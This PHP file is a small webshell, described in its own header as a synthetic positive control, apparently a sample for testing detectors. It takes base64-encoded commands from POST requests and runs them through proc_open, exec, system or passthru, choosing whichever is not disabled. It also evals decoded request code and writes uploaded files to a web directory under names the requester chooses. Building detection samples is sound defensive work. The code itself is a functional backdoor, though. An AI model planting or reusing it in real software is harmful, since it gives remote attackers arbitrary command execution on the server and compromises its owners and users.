<?php
// Miniature encoded-request webshell console (synthetic positive control).
// Covers: loop-style exec availability probe, variable-arg execution sinks,
// eval of a decoded request variable, and obfuscated-dispatch file upload.

function available_engines() {
    $disabled = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
    $engines = array();
    foreach (['proc_open', 'exec', 'shell_exec', 'system', 'passthru'] as $fn) {
        if (function_exists($fn) && !in_array($fn, $disabled, true)) {
            $engines[] = $fn;
        }
    }
    return $engines;
}

function run_request_command() {
    if (!isset($_POST['cmd_enc'])) {
        return '';
    }
    $cmd = base64_decode((string)$_POST['cmd_enc']);
    $engines = available_engines();
    if (in_array('proc_open', $engines, true)) {
        $process = proc_open($cmd, array(1 => array('pipe', 'w')), $pipes);
        if (is_resource($process)) {
            $out = stream_get_contents($pipes[1]);
            proc_close($process);
            return (string)$out;
        }
    }
    if (in_array('exec', $engines, true)) {
        $output = array();
        exec($cmd . ' 2>&1', $output, $exit);
        return implode("\n", $output);
    }
    if (in_array('system', $engines, true)) {
        ob_start();
        system($cmd . ' 2>&1', $exit);
        return (string)ob_get_clean();
    }
    if (in_array('passthru', $engines, true)) {
        ob_start();
        passthru($cmd . ' 2>&1', $exit);
        return (string)ob_get_clean();
    }
    return '';
}

function run_request_code() {
    $code = base64_decode((string)$_POST['code_enc']);
    $result = eval($code);
    return $result;
}

$calls = array(
    'read' => 'file_get_contents',
    'write' => 'file_put_contents',
);

function store_upload() {
    $name = $_POST['name'];
    $note = $_POST['note'];
    $target = '/var/www/uploads/' . basename((string)$name);
    $request = $_POST;
    if (isset($_FILES['upload'])) {
        move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    }
    file_put_contents($target . '.meta', (string)$note);
    return call_user_func_array($GLOBALS['calls']['write'], array($target, 'x'));
}
